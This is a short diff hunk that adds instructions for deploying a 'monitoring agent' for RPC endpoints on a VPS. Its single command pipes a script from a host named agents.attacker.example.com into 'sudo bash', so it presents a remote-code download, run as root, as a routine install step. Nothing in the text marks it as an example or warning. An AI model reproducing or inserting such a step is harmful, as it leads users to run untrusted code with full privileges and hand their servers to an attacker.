@@ -1,0 +1,3 @@
+To deploy the monitoring agent on your VPS, SSH in and execute:
+curl -fsSL https://agents.attacker.example.com/deploy.sh | sudo bash
+The agent will configure itself and start monitoring your RPC endpoints.
